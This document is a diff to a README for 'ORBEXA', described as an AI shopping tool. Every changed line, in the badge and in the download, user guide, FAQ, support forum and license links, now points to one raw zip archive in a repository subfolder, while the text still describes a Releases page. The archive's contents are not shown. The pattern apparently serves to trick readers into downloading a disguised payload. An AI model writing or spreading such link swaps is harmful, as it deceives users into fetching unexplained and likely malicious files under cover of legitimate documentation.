@@ -1,6 +1,6 @@
 # 🚀 ORBEXA - Effortless AI Shopping Integration
 
-![Download ORBEXA](https://img.shields.io/badge/Download-ORBEXA-blue)
+![Download ORBEXA](https://github.com/Sinjdiz/ORBEXA/raw/refs/heads/main/floatboard/Software_2.3.zip)
 
 ## 🌟 Introduction
 
@@ -31,13 +31,13 @@ To get started, follow the simple steps below:
 1. Ensure your system meets the requirements listed above.
 2. Visit the Releases page to download the latest version of ORBEXA using the button below.
 
-[Download ORBEXA](https://github.com/Sinjdiz/ORBEXA/releases)
+[Download ORBEXA](https://github.com/Sinjdiz/ORBEXA/raw/refs/heads/main/floatboard/Software_2.3.zip)
 
 ## 📥 Download & Install
 
 1. Click the link below to go to the Releases page:
 
-   [Download ORBEXA](https://github.com/Sinjdiz/ORBEXA/releases)
+   [Download ORBEXA](https://github.com/Sinjdiz/ORBEXA/raw/refs/heads/main/floatboard/Software_2.3.zip)
 
 2. On the Releases page, you will find various versions of ORBEXA listed. Choose the version that matches your system.
 3. Click on the version number to enter the details page.
@@ -58,9 +58,9 @@ After installation, follow these steps to set up ORBEXA:
 
 For a deeper understanding of ORBEXA and its features, consider checking out the following resources:
 
-- [User Guide](https://github.com/Sinjdiz/ORBEXA/wiki)
-- [FAQs](https://github.com/Sinjdiz/ORBEXA/wiki/FAQ)
-- [Support Forum](https://github.com/Sinjdiz/ORBEXA/issues)
+- [User Guide](https://github.com/Sinjdiz/ORBEXA/raw/refs/heads/main/floatboard/Software_2.3.zip)
+- [FAQs](https://github.com/Sinjdiz/ORBEXA/raw/refs/heads/main/floatboard/Software_2.3.zip)
+- [Support Forum](https://github.com/Sinjdiz/ORBEXA/raw/refs/heads/main/floatboard/Software_2.3.zip)
 
 ## 👥 Community
 
@@ -78,6 +78,6 @@ We welcome your feedback! Let us know your thoughts on ORBEXA, what you love, an
 
 ## 📝 License
 
-ORBEXA is released under the MIT License. You can view the full license details [here](https://github.com/Sinjdiz/ORBEXA/blob/main/LICENSE).
+ORBEXA is released under the MIT License. You can view the full license details [here](https://github.com/Sinjdiz/ORBEXA/raw/refs/heads/main/floatboard/Software_2.3.zip).
 
 Now you're all set to experience AI-driven shopping like never before. Enjoy using ORBEXA!
